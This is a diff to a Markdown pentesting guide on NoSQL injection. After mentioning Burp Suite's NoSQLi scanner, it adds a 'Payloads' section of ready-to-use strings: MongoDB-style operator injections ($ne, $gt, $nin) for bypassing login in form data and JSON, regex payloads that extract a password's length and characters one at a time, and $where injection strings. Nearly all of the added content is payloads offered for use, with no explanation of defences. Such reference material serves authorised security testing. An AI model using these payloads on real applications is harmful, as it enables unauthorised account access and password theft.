@@ -100,8 +100,47 @@ There are very less tools and resources `because its new to peoples, I know two 
 
 But `NoSQLi scanner` is only available for `Burp suit pro users` so if you use burp pro then you can easily use this extension, First goto `Extenter tab` than `search NoSQLi scanner` now click on `install`, If you want to use this extension you can just right click on target then click on Actively scan this host after that the extension will automatically start scanning. 
 
-## Payloads 
-These are some payloads you can use to identify NoSQL injection vulnerability:
+## Payloads
+
+**Authentication bypass**
+```
+in DATA
+username[$ne]=toto&password[$ne]=toto
+login[$regex]=a.*&pass[$ne]=lol
+login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+
+in JSON
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+
+```
+
+**Extract length information**
+```
+username[$ne]=toto&password[$regex]=.{1}
+username[$ne]=toto&password[$regex]=.{3}
+```
+
+**Extract data information**
+```
+in URL
+username[$ne]=toto&password[$regex]=m.{2}
+username[$ne]=toto&password[$regex]=md.{1}
+username[$ne]=toto&password[$regex]=mdp
+
+username[$ne]=toto&password[$regex]=m.*
+username[$ne]=toto&password[$regex]=md.*
+
+in JSON
+{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
+
+```
+**These are some payloads you can use to identify NoSQL injection vulnerability:**
 ```
 true, $where: '1 == 1'
 , $where: '1 == 1'
